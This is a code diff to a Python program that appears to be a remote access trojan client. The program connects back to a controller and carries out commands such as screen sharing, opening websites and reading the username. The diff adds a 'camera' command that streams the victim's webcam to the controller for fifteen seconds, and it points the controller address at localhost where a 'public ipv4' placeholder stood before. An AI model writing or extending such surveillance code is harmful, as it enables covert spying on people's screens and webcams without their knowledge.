@@ -2,7 +2,7 @@ import socket
 import os
 import traceback
 import shutil
-from vidstream import ScreenShareClient
+from vidstream import ScreenShareClient, CameraClient
 import threading
 import time
 import webbrowser
@@ -11,7 +11,8 @@ import pyautogui
 
 
 # requires port forwarding
-ip = "public ipv4"
+#ip = "public ipv4"
+ip = "127.0.0.1"
 port = 8080
 keepgoing = True
 
@@ -36,6 +37,9 @@ def main():
                     username(sockk)
                 elif msg == "screenshare":
                     screenshare(sockk)
+                    sockk = connnnect()
+                elif msg == "camera":
+                    camera(sockk)
                     sockk = connnnect()
                 elif msg == "website":
                     website(sockk)
@@ -98,7 +102,6 @@ def username(sock):
 
 
 def screenshare(sock):
-    #time = sock.recv(1024)
     sock.close()
     sender = ScreenShareClient(ip, 8080)
     t = threading.Thread(target=sender.start_stream)
@@ -108,6 +111,15 @@ def screenshare(sock):
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     return sock
 
+def camera(sock):
+    sock.close()
+    sender = CameraClient(ip, 8080)
+    t = threading.Thread(target=sender.start_stream)
+    t.start()
+    time.sleep(15)
+    sender.stop_stream()
+    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    return sock
 
 
 def website(sock):
